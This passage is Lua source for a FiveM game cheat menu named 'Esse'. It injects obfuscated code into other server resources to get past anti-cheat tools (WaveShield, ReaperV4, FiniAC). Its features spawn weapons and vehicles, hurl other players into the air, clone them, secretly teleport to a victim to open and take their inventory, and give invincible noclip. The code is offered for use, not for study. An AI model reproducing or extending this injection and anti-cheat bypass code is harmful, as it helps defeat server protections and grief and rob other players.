        ogCoords.x .. [[, ]] .. ogCoords.y .. [[, ]] .. ogCoords.z .. [[, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ]] .. ogHeading .. [[)
            end
        end, GetEntityCoords(PlayerPedId()), true, true)
    ]])
    elseif serverEndpoint:match("([^:]+)") == "185.244.106.12" and GetResourceState("drc_gardener") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 5)", 3000)

        Injection("drc_gardener", string.format([[
        function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

        local model = "%s"

        if %s then
            DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
        end

        local ogCoords = GetEntityCoords(PlayerPedId())
        local ogHeading = GetEntityHeading(PlayerPedId())

        SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

        if not %s then
            SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
            SetEntityHeading(PlayerPedId(), ogHeading)
        end
    ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("lunar_bridge") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 6)", 3000)

        Injection("lunar_bridge", string.format([[
        local model = "%s"
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local heading = GetEntityHeading(ped)
        local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

        if %s then
            DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
        end

        Framework.spawnVehicle(model, offset, heading, function(vehicle)
            if not vehicle or not DoesEntityExist(vehicle) then return end
            SetVehicleOnGroundProperly(vehicle)
            Citizen.Wait(500)
            if %s then
                TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
            end
        end)
    ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("lation_laundering") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 7)", 3000)

        Injection("lation_laundering", string.format([[
        function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

        local function spawnVehicle()
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
            DoScreenFadeOut(800)
            while not IsScreenFadedOut() do
                Citizen.Wait(100)
            end
            local vehicle = SpawnVehicle(model, position)
            if not vehicle or not DoesEntityExist(vehicle) then
                ShowNotification("~r~Error: Failed to spawn vehicle.")
                DoScreenFadeIn(800)
                return
            end
            SetVehicleOnGroundProperly(vehicle)
            Citizen.Wait(500)
            if %s then
                TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
            end
            SetModelAsNoLongerNeeded(GetHashKey(model))
            DoScreenFadeIn(800)
            ShowNotification("~g~Vehicle spawned successfully!")
        end

        if %s then
            DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
        end

        spawnVehicle()
    ]], model, tostring(teleportInto), tostring(deletePrevious)))
    else
        local fallback = enviGetStartedFallbackResource()
        if fallback then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 8)", 3000)

            Injection(fallback, string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.SpawnVehicle(function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end, model, offset, false)
        ]], model, tostring(deletePrevious), tostring(teleportInto)))
        elseif GetResourceState("monitor") == "started" or GetResourceState("ox_lib") == "started" then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 9)", 3000)

            if not model or model == "" then return end

            local function b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return "{" .. table.concat(t, ",") .. "}"
            end

            local modelLit = b(model)
            local deletePrev = tostring(deletePrevious)
            local warpIn = tostring(teleportInto)

            local payload = string.format([[
    local h = function(n, f)
        local o = _G[n]
        if o and type(o) == "function" then
            _G[n] = function(...) return f(o, ...) end
        end
    end
    local d = function(t)
        local s = ""
        for i = 1, #t do s = s .. string.char(t[i]) end
        return s
    end
    local g = function(e) return _G[d(e)] end
    local w = function(ms) Citizen.Wait(ms) end

    h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
    h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
    h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

    local function f()
        local p = g({80,108,97,121,101,114,80,101,100,73,100})()
        local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
        local mn = d(%s)
        local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

        g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
        while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

        if %s then
            local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
            if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
            end
        end

        local z = c.z + 1.0
        local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

        if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
            g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
            w(100)
        end
    end

    local co = coroutine.create(f)
    while coroutine.status(co) ~= "dead" do
        local ok = coroutine.resume(co)
        if not ok then break end
        w(0)
    end
]], modelLit, deletePrev, warpIn)

            local ok, err = pcall(MachoInjectResourceRaw, "monitor", payload)
            if not ok then
            end
            return
        end

        if GetResourceState("lb-phone") == "started" then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 10)", 3000)

            local success, err = pcall(function()
                Injection("lb-phone", ([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                if not %s then
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            ]]):format(tostring(deletePrevious), model, tostring(teleportInto), ogCoords.x, ogCoords.y, ogCoords.z,
                    ogHeading))
            end)
            if not success then
            end
        elseif GetResourceState("qb-core") == "started" then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 11)", 3000)

            Injection("lb-phone", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
            local success, err = pcall(function()
                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]], tostring(deletePrevious), GetHashKey(model), tostring(teleportInto)))
        else
            return
        end
    end
end

function Esse:SpawnSelectedWeapon(weaponModel)
    if not weaponModel or weaponModel == "" then return end

    local function encodeToByteArrayLiteral(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return table.concat(t, ",")
    end

    local weaponBytes = encodeToByteArrayLiteral(weaponModel)
    local playerPed = PlayerPedId()
    if not playerPed or playerPed <= 0 then return end

    local weaponHash = GetHashKey(weaponModel)
    if weaponHash == 0 then return end

    local WaveShit = GetResourceState("WaveShield") == 'started'

    if WaveShit then
        self:Notify("success", "Esse", "Spawned Weapon via WaveShield Bypass V2", 3000)
        Injection(
        GetResourceState("ox_lib") == "started" and "ox_lib" or
        GetResourceState("WaveShield") == "started" and "WaveShield" or "any", string.format([[
        if not _G.EsseWeaponBypass then
            _G.EsseWeaponBypass = { enabled = false }
        end
        _G.EsseWeaponBypass.enabled = true

        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end

        hNative("GetHashKey", function(orig, str) return orig(str) end)
        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
            if _G.EsseWeaponBypass and _G.EsseWeaponBypass.enabled then
                return orig(ped, hash, ammo, false, true)
            else
                return orig(ped, hash, ammo, isHidden, equipNow)
            end
        end)
        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
            if _G.EsseWeaponBypass and _G.EsseWeaponBypass.enabled then
                return orig(ped, hash, true)
            else
                return orig(ped, hash, equipNow)
            end
        end)

        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function initFlow(cb)
            local co = coroutine.create(cb)
            local ok, err
            while coroutine.status(co) ~= "dead" do
                ok, err = coroutine.resume(co)
                if not ok then
                    print("WaveShield WeaponBypass error:", err)
                    break
                end
                Citizen.Wait(0)
            end
        end

        initFlow(function()
            local ped = %d
            if _g(_b("DoesEntityExist"))(ped) then
                local weaponName = _d({%s})
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if weaponHash and weaponHash ~= 0 then
                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                end
            end
        end)
    ]], playerPed, weaponBytes))
    elseif GetResourceState("ReaperV4") == "started" then
        MachoResourceStop("ox_inventory")
        MachoResourceStop("ox_lib")
        self:Notify("success", "Esse", "Spawned Weapon via ReaperV4 fallback", 3000)
        GiveWeaponToPed(playerPed, weaponHash, 9999, false, true)
        SetCurrentPedWeapon(playerPed, weaponHash, true)
        Wait(250)
        MachoInjectResource2("AsThreadNs", "ReaperV4", [[
        local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]] .. weaponHash .. [[", true, true)
        if success then
            print("Updated Cache Successfully")
        else
            print("Failed to Update Cache")
        end
    ]])
    elseif GetResourceState("FiniAC") == "started" then
        self:Notify("info", "Esse", "Spawned Weapon Bypass #1", 3000)
        MachoResourceStop("ox_inventory")
        Injection(
            GetResourceState("911elemento") == "started" and "monitor" or "any",
            string.format([[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end

            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end

            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function _w(n)
                return Citizen.Wait(n)
            end

            local function _s()
                local ped = _g(_b("PlayerPedId"))()
                local coords = _g(_b("GetEntityCoords"))(ped)
                local weaponName = _d({%s})
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if weaponHash and weaponHash ~= 0 then
                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                end
            end
            _s()
        ]], weaponBytes)
        )
    else
        self:Notify("info", "Esse", "Spawned Weapon Bypass #2", 3000)
        MachoResourceStop("ox_inventory")
        Injection(
            GetResourceState("911elemento") == "started" and "monitor" or "any",
            string.format([[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end

            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end

            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function _w(n)
                return Citizen.Wait(n)
            end

            local function _s()
                local ped = _g(_b("PlayerPedId"))()
                local coords = _g(_b("GetEntityCoords"))(ped)
                local weaponName = _d({%s})
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if weaponHash and weaponHash ~= 0 then
                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                end
            end

            _s()
        ]], weaponBytes)
        )
    end
end

function Esse:HandleLaunchPlayer(playerIds, radius)
    if not playerIds or #playerIds == 0 then return end
    local targetServerId = tonumber(playerIds[1])
    if not targetServerId then return end
    radius = radius or 3000.0

    CreateThread(function()
        local clientId = GetPlayerFromServerId(targetServerId)
        if not clientId or clientId == -1 then return end
        local targetPed = GetPlayerPed(clientId)
        if not targetPed or not DoesEntityExist(targetPed) then return end

        local myPed = PlayerPedId()
        local originalCoords = GetEntityCoords(myPed)
        local targetCoords = GetEntityCoords(targetPed)

        -- Kunin ang control ng target
        local timeout = 0
        while not NetworkHasControlOfEntity(targetPed) and timeout < 50 do
            NetworkRequestControlOfEntity(targetPed)
            Wait(10)
            timeout = timeout + 1
        end

        -- I-teleport sa ere
        SetEntityCoords(targetPed, targetCoords.x, targetCoords.y, targetCoords.z + 500.0, false, false, false, false)
        SetPedToRagdoll(targetPed, 5000, 5000, 0, false, false, false)

        -- Ibalik ang sarili (kung na-teleport)
        if #(GetEntityCoords(myPed) - originalCoords) > 10 then
            SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
        end

        Esse:Notify("success", "Launch", "Player launched!", 3000)
    end)
end

function Esse:HandleClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end

    local playerIdsStr = table.concat(playerIds, ",")
    MachoInjectResourceRaw("any", string.format([[
    local function decode(tbl)
        local s = ""
        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
        return s
    end
    local function g(n)
        return _G[decode(n)]
    end
    local function wait(n)
        return Citizen.Wait(n)
    end
    local function findClientIdByServerId(sid)
        local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
        for _, pid in ipairs(players) do
            if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                return pid
            end
        end
        return nil
    end
    local playerIds = {%s}
    for _, targetServerId in ipairs(playerIds) do
        local clientId = findClientIdByServerId(targetServerId)
        local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
        if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                wait(0)
            end
            g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
        end
    end
]], playerIdsStr))
end

function Esse:HandleTakeInventory(playerIds)
    if not playerIds or #playerIds == 0 then return end
    local targetServerId = tonumber(playerIds[1])
    if not targetServerId then return end



    local WaveDihStarted = GetResourceState("WaveShield") == 'started'

    if WaveDihStarted then
        MachoInjectResourceRaw("ox_inventory", string.format([[
    local function _b(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return t
    end
    local function _d(tbl)
        local s = ""
        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
        return s
    end
    local function _g(n)
        local k = _d(n)
        local f = _G[k]
        return f
    end
    local function _w(n)
        return Citizen.Wait(n)
    end

    local function findClientIdByServerId(sid)
        local players = _g(_b("GetActivePlayers"))()
        for _, pid in ipairs(players) do
            if _g(_b("GetPlayerServerId"))(pid) == sid then
                return pid
            end
        end
        return nil
    end

    local function getSafeNearbyCoord(entity)
        local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
        local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
        if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
        return behind
    end

    local function stealthTeleportToEntity(entity)
        if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
        local me = _g(_b("PlayerPedId"))()
        local originalPos = _g(_b("GetEntityCoords"))(me)
        local wasVisible = _g(_b("IsEntityVisible"))(me)
        _g(_b("SetEntityVisible"))(me, false, false)
        _g(_b("SetEntityInvincible"))(me, true)
        _g(_b("SetEntityCollision"))(me, false, false)
        _g(_b("FreezeEntityPosition"))(me, true)
        _w(0)
        local dest = getSafeNearbyCoord(entity)
        if _g(_b("IsPedInAnyVehicle"))(me, false) then
            local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
            if veh and veh ~= 0 then
                _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
        else
            _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
        end
        _w(50)
        _g(_b("FreezeEntityPosition"))(me, false)
        _g(_b("SetEntityCollision"))(me, true, true)
        _g(_b("SetEntityInvincible"))(me, false)
        _g(_b("SetEntityVisible"))(me, wasVisible, false)
        return originalPos
    end

    local function restoreOriginalPosition(entity, originalPos)
        if not originalPos then return end
        _g(_b("FreezeEntityPosition"))(entity, true)
        if _g(_b("IsPedInAnyVehicle"))(entity, false) then
            local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
            if veh and veh ~= 0 then
                _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
        else
            _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
        end
        _w(50)
        _g(_b("FreezeEntityPosition"))(entity, false)
    end

    local function forceHandsUp(entity)
        local animDict, animName = "missminuteman_1ig_2", "handsup_base"
        _g(_b("RequestAnimDict"))(animDict)
        while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
        _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
    end

    -- === ONLY CHANGE: NO CreateThread ===
    local co = coroutine.create(function()
        _w(100)
        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
        if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
            local me = _g(_b("PlayerPedId"))()
            local originalPos = stealthTeleportToEntity(targetPed)
            _w(100)
            forceHandsUp(targetPed)
            _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
            _w(100)
            restoreOriginalPosition(me, originalPos)
        end
    end)
    while coroutine.status(co) ~= "dead" do
        local ok, err = coroutine.resume(co)
        if not ok then print("Esse Coroutine error:", err); break end
        _w(0)
    end
]], targetServerId))
    else
        MachoInjectResource2("AsThreadNs", "ox_inventory", string.format([[
    local function findClientIdByServerId(sid)
        local players = GetActivePlayers()
        for _, pid in ipairs(players) do
            if GetPlayerServerId(pid) == sid then
                return pid
            end
        end
        return nil
    end

    local function getSafeNearbyCoord(entity)
        local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
        local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
        if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
        return behind
    end

    local function stealthTeleportToEntity(entity)
        if not entity or not DoesEntityExist(entity) then return nil end
        local me = PlayerPedId()
        local originalPos = GetEntityCoords(me)
        local wasVisible = IsEntityVisible(me)
        SetEntityVisible(me, false, false)
        SetEntityInvincible(me, true)
        SetEntityCollision(me, false, false)
        FreezeEntityPosition(me, true)
        Citizen.Wait(0)
        local dest = getSafeNearbyCoord(entity)
        if IsPedInAnyVehicle(me, false) then
            local veh = GetVehiclePedIsIn(me, false)
            if veh and veh ~= 0 then
                SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
        else
            SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
        end
        Citizen.Wait(50)
        FreezeEntityPosition(me, false)
        SetEntityCollision(me, true, true)
        SetEntityInvincible(me, false)
        SetEntityVisible(me, wasVisible, false)
        return originalPos
    end

    local function restoreOriginalPosition(entity, originalPos)
        if not originalPos then return end
        FreezeEntityPosition(entity, true)
        if IsPedInAnyVehicle(entity, false) then
            local veh = GetVehiclePedIsIn(entity, false)
            if veh and veh ~= 0 then
                SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
        else
            SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
        end
        Citizen.Wait(50)
        FreezeEntityPosition(entity, false)
    end

    local function forceHandsUp(entity)
        local animDict, animName = "missminuteman_1ig_2", "handsup_base"
        RequestAnimDict(animDict)
        while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
        TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
    end

    local targetServerId = %d
    local clientId = findClientIdByServerId(targetServerId)
    local targetPed = clientId and GetPlayerPed(clientId) or nil
    if targetPed and DoesEntityExist(targetPed) then
        local me = PlayerPedId()
        local originalPos = stealthTeleportToEntity(targetPed)
        Citizen.Wait(100)
        forceHandsUp(targetPed)
        TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
        Citizen.Wait(100)
        restoreOriginalPosition(me, originalPos)
    end
]], targetServerId))
    end
end

function Esse:BuildMenuFromWeaponList(categoryWeapons)
    local menuValues = {}

    for _, model in ipairs(categoryWeapons) do
        if WeaponList[model] then
            menuValues[#menuValues + 1] = WeaponList[model].label
        end
    end

    return menuValues
end

function Esse:GetWeaponModelFromLabel(modelLabel)
    for model, data in pairs(WeaponList) do
        if data.label == modelLabel then
            return model
        end
    end

    return ""
end

function Esse:RunButterflyNoclip(enable)
    if enable then
        self:Notify("success", "Esse", "Butterfly Noclip Enabled", 3000)

        local currentSpeed = _G.MachoSliderVal or 10
        local code = string.format([[
        _G.ButterflyActive = true
        _G.MachoSliderVal = _G.MachoSliderVal or %f

        -- Preload particle effect
        RequestNamedPtfxAsset("core")
        while not HasNamedPtfxAssetLoaded("core") do
            Citizen.Wait(0)
        end

        Citizen.CreateThread(function()
            local p = PlayerPedId()

            while _G.ButterflyActive do
                Citizen.Wait(0)
                local ent = IsPedInAnyVehicle(p, false) and GetVehiclePedIsIn(p, false) or p
                local rot = GetGameplayCamRot(2)

                SetPedComponentVariation(p, 5, 0, 0, 0)
                SetEntityCollision(ent, false, false)
                SetEntityInvincible(ent, true)
                FreezeEntityPosition(ent, false)

                -- Skydiving animation
                if not IsPedInParachuteFreeFall(p) then
                    TaskSkyDive(p)
                end

                -- 🔁 Basahin ang speed sa bawat frame para dynamic
                local sVal = _G.MachoSliderVal or 10
                local baseSpeed = 100.0 + (sVal * 2.0)

                local speed = IsControlPressed(0, 21) and (baseSpeed * 2.5) or baseSpeed
                local vx, vy, vz = 0.0, 0.0, 0.0

                if IsControlPressed(0, 32) then -- W
                    vx = vx + (-math.sin(math.rad(rot.z)) * speed)
                    vy = vy + (math.cos(math.rad(rot.z)) * speed)
                    vz = vz + (math.sin(math.rad(rot.x)) * speed)
                end

                if IsControlPressed(0, 31) then -- S
                    vx = vx - (-math.sin(math.rad(rot.z)) * speed)
                    vy = vy - (math.cos(math.rad(rot.z)) * speed)
                    vz = vz - (math.sin(math.rad(rot.x)) * speed)
                end

                if IsControlPressed(0, 34) then -- A
                    vx = vx + (-math.cos(math.rad(rot.z)) * (speed * 0.7))
                    vy = vy + (-math.sin(math.rad(rot.z)) * (speed * 0.7))
                end

                if IsControlPressed(0, 35) then -- D
                    vx = vx + (math.cos(math.rad(rot.z)) * (speed * 0.7))
                    vy = vy + (math.sin(rot.z * 0.0174533) * (speed * 0.7))
                end

                SetEntityVelocity(ent, vx, vy, vz)
                SetEntityHeading(ent, rot.z)

                -- Slipstream effect
                local currentSpeedVal = math.sqrt(vx*vx + vy*vy + vz*vz)
                if currentSpeedVal > 150.0 then
                    UseParticleFxAssetNextCall("core")
                    local pos = GetEntityCoords(ent)
                    StartNetworkedParticleFxNonLoopedAtCoord("exp_gas_leak", pos.x, pos.y, pos.z - 1.0, 0.0, 0.0, 0.0, 0.5, false, false, false)
                end
            end

            -- Cleanup
            local p_end = PlayerPedId()
            local ent_end = IsPedInAnyVehicle(p_end, false) and GetVehiclePedIsIn(p_end, false) or p_end
            SetEntityCollision(ent_end, true, true)
            SetEntityInvincible(p_end, false)
            ClearPedTasksImmediately(p_end)
        end)
    ]], currentSpeed)

        local targetRes = (GetResourceState("monitor") == "started" and "monitor") or "any"
        Injection(targetRes, code)
    else
        self:Notify("error", "Esse", "Butterfly Noclip Disabled", 3000)
        local targetRes = (GetResourceState("monitor") == "started" and "monitor") or "any"
        Injection(targetRes, "_G.ButterflyActive = false")
    end
end

function Esse:RepairVehicle()
    Injection(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
    local function _b(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return t
    end

    local function _d(tbl)
        local s = ""
        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
        return s
    end

    local function _g(n)
        local k = _d(n)
        local f = _G[k]
        return f
    end

    local function _w(n)
        return Citizen.Wait(n)
    end

